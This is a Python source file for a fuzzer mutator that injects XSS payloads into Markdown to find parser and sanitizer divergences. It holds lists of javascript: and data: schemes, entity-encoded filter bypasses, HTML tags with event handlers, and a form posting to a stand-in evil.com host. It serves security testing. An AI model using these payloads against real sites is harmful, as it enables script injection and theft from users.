"""Markdown-aware mutator for differential parsing fuzzing.

Strategies target security-relevant constructs that cause
parser divergences: link schemes, HTML injection, entity bypasses,
autolink confusion, code fence boundaries.
"""

from __future__ import annotations

import logging
import random
import re
from typing import TYPE_CHECKING

logger = logging.getLogger(__name__)

from ..protocols import Input

if TYPE_CHECKING:
    from ..corpus import Seed


# Regex patterns
_RE_LINK = re.compile(rb'\[([^\]]*)\]\(([^)]*)\)')
_RE_IMAGE = re.compile(rb'!\[([^\]]*)\]\(([^)]*)\)')
_RE_HTML_TAG = re.compile(rb'<([a-z][a-z0-9]*)[^>]*>', re.I)
_RE_AUTOLINK = re.compile(rb'<(https?://[^>]+)>')
_RE_HREF = re.compile(rb'href\s*=\s*["\']([^"\']*)["\']', re.I)
_RE_CODE_FENCE = re.compile(rb'^(`{3,}|~{3,})', re.M)

# Payload pools
JS_SCHEMES = [
    b"javascript:alert(1)",
    b"jAvAsCrIpT:alert(1)",
    b"javascript&#58;alert(1)",
    b"&#x6A;avascript:alert(1)",
    b"java\\nscript:alert(1)",
    b"data:text/html,<script>alert(1)</script>",
    b"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    b"vbscript:MsgBox(1)",
]

HTML_INJECTIONS = [
    b"<script>alert(1)</script>",
    b"<iframe src='javascript:alert(1)'></iframe>",
    b'<div onmouseover="alert(1)">test</div>',
    b'<svg onload="alert(1)">',
    b'<img src=x onerror="alert(1)">',
    b"<details open ontoggle=alert(1)>",
    b"<form action='http://evil.com'><input type=submit></form>",
    b"<object data='javascript:alert(1)'>",
    b"<embed src='javascript:alert(1)'>",
    b"<math><mtext><img src=x onerror=alert(1)></mtext></math>",
]

EVENT_HANDLERS = [
    b'onmouseover="alert(1)"',
    b'onclick="alert(1)"',
    b'onerror="alert(1)"',
    b'onload="alert(1)"',
    b'onfocus="alert(1)" autofocus',
    b'onblur="alert(1)"',
    b'ontoggle="alert(1)"',
]

ENTITY_PAYLOADS = [
    b"&#x6A;avascript:alert(1)",
    b"&#106;avascript:alert(1)",
    b"&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;alert(1)",
    b"java&NewLine;script:alert(1)",
    b"java&Tab;script:alert(1)",
]


class MarkdownMutator:
    """Markdown-aware semantic mutator."""

    name = "markdown"

    _STRATEGIES = [
        ("link_scheme", 25),
        ("html_injection", 25),
        ("entity_bypass", 10),
        ("autolink_confusion", 10),
        ("event_handler_inject", 10),
        ("code_fence_break", 5),
        ("reference_link", 5),
        ("backslash_escape", 5),
        ("emphasis_nest", 3),
        ("whitespace_trick", 2),
    ]

    def __init__(self, seed: int | None = None):
        self._rng = random.Random(seed)
        self._strategy_names = [s[0] for s in self._STRATEGIES]
        self._strategy_weights = [s[1] for s in self._STRATEGIES]

    def mutate(self, inp: Input, corpus: list[Seed]) -> Input:
        data = inp.data
        strategy = self._rng.choices(
            self._strategy_names, weights=self._strategy_weights, k=1
        )[0]

        method = getattr(self, f"_mutate_{strategy}", None)
        if method is None:
            return Input(data=data, metadata={"mutator": self.name, "strategy": "identity"})

        try:
            mutated = method(data)
        except Exception:
            mutated = data

        return Input(
            data=mutated,
            metadata={"mutator": self.name, "strategy": strategy},
        )

    def _mutate_link_scheme(self, data: bytes) -> bytes:
        """Replace link URL with dangerous scheme."""
        m = _RE_LINK.search(data)
        if m:
            text = m.group(1)
            scheme = self._rng.choice(JS_SCHEMES)
            return data[:m.start()] + b"[" + text + b"](" + scheme + b")" + data[m.end():]
        # No existing link — create one
        scheme = self._rng.choice(JS_SCHEMES)
        return data + b"\n\n[click](" + scheme + b")"

    def _mutate_html_injection(self, data: bytes) -> bytes:
        """Insert raw HTML block."""
        payload = self._rng.choice(HTML_INJECTIONS)
        pos = self._rng.choice([0, len(data)])
        if pos == 0:
            return payload + b"\n\n" + data
        return data + b"\n\n" + payload

    def _mutate_entity_bypass(self, data: bytes) -> bytes:
        """Replace javascript: with entity-encoded variant."""
        payload = self._rng.choice(ENTITY_PAYLOADS)
        m = _RE_LINK.search(data)
        if m:
            text = m.group(1)
            return data[:m.start()] + b"[" + text + b"](" + payload + b")" + data[m.end():]
        return data + b"\n\n[click](" + payload + b")"

    def _mutate_autolink_confusion(self, data: bytes) -> bytes:
        """Toggle autolink forms."""
        m = _RE_AUTOLINK.search(data)
        if m:
            url = m.group(1)
            # Convert <url> to bare url or [text](url)
            if self._rng.random() < 0.5:
                return data[:m.start()] + url + data[m.end():]
            return data[:m.start()] + b"[link](" + url + b")" + data[m.end():]
        # Add autolink
        if self._rng.random() < 0.5:
            return data + b"\n\n<javascript:alert(1)>"
        return data + b"\n\nhttp://example.com\"><img src=x onerror=alert(1)>"

    def _mutate_event_handler_inject(self, data: bytes) -> bytes:
        """Inject event handler into existing HTML tag."""
        handler = self._rng.choice(EVENT_HANDLERS)
        m = _RE_HTML_TAG.search(data)
        if m:
            tag_end = data.index(b">", m.start())
            return data[:tag_end] + b" " + handler + data[tag_end:]
        # No HTML tag — create one
        tag = self._rng.choice([b"div", b"img", b"svg", b"details"])
        return data + b"\n\n<" + tag + b" " + handler + b">"

    def _mutate_code_fence_break(self, data: bytes) -> bytes:
        """Try to break out of code fences."""
        m = _RE_CODE_FENCE.search(data)
        if m:
            fence = m.group(1)
            payload = self._rng.choice(HTML_INJECTIONS)
            return data[:m.end()] + b"\n" + fence + b"\n" + payload + b"\n"
        # Create a misleading fence
        payload = self._rng.choice(HTML_INJECTIONS)
        return b"```\ncode\n```\n" + payload

    def _mutate_reference_link(self, data: bytes) -> bytes:
        """Create reference link with dangerous URL."""
        scheme = self._rng.choice(JS_SCHEMES)
        ref_id = b"ref" + str(self._rng.randint(1, 99)).encode()
        return data + b"\n\n[click][" + ref_id + b"]\n\n[" + ref_id + b"]: " + scheme

    def _mutate_backslash_escape(self, data: bytes) -> bytes:
        """Add/remove backslash at interesting positions."""
        targets = [b"[", b"]", b"(", b")", b"<", b">", b"`", b"*", b"_"]
        target = self._rng.choice(targets)
        idx = data.find(target)
        if idx >= 0:
            if idx > 0 and data[idx - 1:idx] == b"\\":
                return data[:idx - 1] + data[idx:]  # remove escape
            return data[:idx] + b"\\" + data[idx:]  # add escape
        return data

    def _mutate_emphasis_nest(self, data: bytes) -> bytes:
        """Create deeply nested emphasis around content."""
        depth = self._rng.randint(3, 10)
        marker = self._rng.choice([b"*", b"_"])
        prefix = marker * depth
        suffix = marker * depth
        payload = self._rng.choice(HTML_INJECTIONS)
        return prefix + payload + suffix

    def _mutate_whitespace_trick(self, data: bytes) -> bytes:
        """Insert significant whitespace."""
        tricks = [
            (b"(", b"(\t"),  # tab in link URL
            (b"[", b"[\n"),  # newline in link text
            (b"](", b"]\n("),  # newline between text and URL
            (b"://", b"://\t"),  # tab in URL
        ]
        target, replacement = self._rng.choice(tricks)
        idx = data.find(target)
        if idx >= 0:
            return data[:idx] + replacement + data[idx + len(target):]
        return data

    def reset_weights(self, boost_zero_finds: bool = False) -> None:
        """Reset to default weights (called by stall detection)."""
        self._strategy_weights = [s[1] for s in self._STRATEGIES]
        logger.info("MarkdownMutator weights reset to default")
